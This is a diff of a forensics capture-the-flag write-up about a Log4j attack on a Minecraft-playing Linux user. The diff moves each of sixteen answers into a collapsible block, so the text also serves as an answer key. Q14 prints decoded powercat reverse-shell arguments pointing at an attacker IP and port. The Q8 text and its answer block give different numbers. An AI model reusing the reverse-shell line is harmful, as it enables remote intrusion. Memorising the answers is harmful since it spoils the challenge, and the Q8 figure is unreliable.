@@ -38,9 +38,10 @@ I also went to export firefox history file (`places.sqlite`) to get better conte
 
 After open sqlite file with DB Browser for SQLite, we can confirm that Minecraft is the target of this vulnerability  
 
-```
-log4j
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>log4j</code></pre>
+</details>
 
 > Q2: Mischievous Lemur -> What is the version ID number of the operating system on the machine?
 
@@ -48,9 +49,10 @@ log4j
 
 Linux stores os information in many files including `/etc/issue` so we just need to get one of them to answer this
 
-```
-21.10
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>21.10</code></pre>
+</details>
 
 > Q3: $whoami -> What is the hostname of the computer?
 
@@ -58,9 +60,10 @@ Linux stores os information in many files including `/etc/issue` so we just need
 
 Linux stores hostname in `/etc/hostname` 
 
-```
-rshell-lenovo
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>rshell-lenovo</code></pre>
+</details>
 
 > Q4: A little blue birdie told me -> What is one anime that the user likes?
 
@@ -70,9 +73,10 @@ When talking about blue bird, there are 2 things that came to my mind directly b
 
 We can see that thunderbird stores inbox and other information inside `/home/rafael/.thunderbird/vrvcx2qf.default-release/ImapMail/imap.gmail.com` directly and then when we search for anime, it returns with twitter url and it mentioned Attack on Titan which is the answer of this question
 
-```
-Attack on Titan
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>Attack on Titan</code></pre>
+</details>
 
 > Q5: Into the Matrix, we go -> What is the UUID for the attacker's Minecraft account?
 
@@ -80,9 +84,10 @@ Attack on Titan
 
 We can obtain this answer by reading the content of `/home/rafael/.minecraft/usercache.json`
 
-```
-8b0dec19-b463-477e-9548-eef20c861492
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>8b0dec19-b463-477e-9548-eef20c861492</code></pre>
+</details>
 
 > Q6: Today's Youtube video is sponsored by... -> What VPN client did the user install and use on the machine?
 
@@ -94,9 +99,10 @@ Back to firefox history file, we can see that user was searching for easy server
 
 Which lead me to `/var/log/apt/history.log`, you can see that user used `apt-get install -y zerotier-one` to install this vpn
 
-```
-zerotier
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>zerotier</code></pre>
+</details>
 
 > Q7: Be our guest -> What was the user's first password for the guest wifi?
 
@@ -104,9 +110,10 @@ zerotier
 
 We will not find an answer from `/etc/Network` directory but from thunderbird inbox file and we will need to dig a little bit deeper too, since there are many guest wifi password sent on the inbox
 
-```
-093483
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>093483</code></pre>
+</details>
 
 > Q8: If a picture is worth a thousand words, how many is a video worth? -> The user watched a video that premiered on Dec 11th, 2021. How many views did it have when they watched it on February 9th?
 
@@ -126,9 +133,10 @@ But this question also telling us that it is a picture so I checked `/home/rafae
 
 But the answer is 265345 which is the viewcount of the first image that was taken on that day
 
-```
-265342
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>265342</code></pre>
+</details>
 
 > Q9: I'm hungry for videos -> What is the new channel name for the YouTuber whose cookbook is shown on the device?
 
@@ -142,9 +150,10 @@ And we can find several images with this cookbook within `/home/rafael/marshalse
 
 Searching for this cookbook then we will find a youtuber who wrote this cookbook
 
-```
-Babish Culinary Universe
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>Babish Culinary Universe</code></pre>
+</details>
 
 > Q10: Hunt the Wumpus -> What is the module with the highest installed version for the chat application with the mascot Wumpus?
 
@@ -156,9 +165,10 @@ We can find `module.log` inside `/home/rafael/.config/.discord/` directory and m
 
 We have to dig deeper into `/home/rafael/.config/.discord/0.0.16/modules/` directory where `installed.json` is located which already sum ups all modules that were installed with versions
 
-```
-discord_voice
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>discord_voice</code></pre>
+</details>
 
 > Q11: It's raining ocelots and wolves -> According to Windows, what was the temperature in Fahrenheit on February 11th, 2022, at 6:30 PM?
 
@@ -166,9 +176,10 @@ discord_voice
 
 We got disk images of Ubuntu 20.04 so we will not find anything related to Windows except for these screenshot image stored in poc directory, find the one that was taken on Feb 11th which will lead us to this image 
 
-```
-45F
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>45F</code></pre>
+</details>
 
 > Q12: Never gonna give... up on this question -> What is the upload date of the second youtube video on the channel from which the user downloaded a youtube video?
 
@@ -186,9 +197,10 @@ Lets go to Rick Ashley's youtube channel and find his second video, (BTW RICKROL
 
 ![fc059c544a69be30ea999c34f8de0e06.png](/resources/fc059c544a69be30ea999c34f8de0e06.png)
 
-```
-10/25/2009
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>10/25/2009</code></pre>
+</details>
 
 > Q13: Buzzy Bees -> What is the SHA-1 hash of Minecraft's "latest" release according to the system?
 
@@ -200,9 +212,10 @@ We can obtain the answer from `/home/rafael/.minecraft/version/version_manifest_
 
 Including SHA1
 
-```
-3c6e119c0ff307accf31b596f9cd47ffa2ec6305
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>3c6e119c0ff307accf31b596f9cd47ffa2ec6305</code></pre>
+</details>
 
 > Q14: The RCE is base(64)d on what? -> What were the three flags and their values that were passed to powercat? The answer must be provided in the same format as the entered command. (For example, if the command was "powercat -D Y -l a -n," the answer would be "-D Y -l a -n")
 
@@ -218,9 +231,10 @@ But if we goes back to poc directory, we can see `Log4jRCE.java` that actually e
 
 Decode base64 string that we will have all the arguments that will be passed to powercat
 
-```
--c 192.168.191.253 -p 4444 -e cmd
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>-c 192.168.191.253 -p 4444 -e cmd</code></pre>
+</details>
 
 > Q15: Hello (New) World -> How many dimensions (including the overworld) did the player travel to in the "oldest of the worlds"?
 
@@ -246,9 +260,10 @@ There is no "nether" either
 
 So we only have "Overworld" left which is the world for all players begin their journey
 
-```
-one
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>one</code></pre>
+</details>
 
 > Q16: Matrix_1999 is the key! -> What is the mojangClientToken stored in the Keystore?
 
@@ -276,9 +291,10 @@ The question already gave us rafael's password, so click Unlock then we will be 
 
 Which including the mojangClientToken that we are looking for
 
-```
-2f76c8b04c004ddd888a05a6cad6be52
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>2f76c8b04c004ddd888a05a6cad6be52</code></pre>
+</details>
 
 ![8ba3c73fe2a44d295f109c0385cc4079.png](/resources/8ba3c73fe2a44d295f109c0385cc4079.png)
 * * *
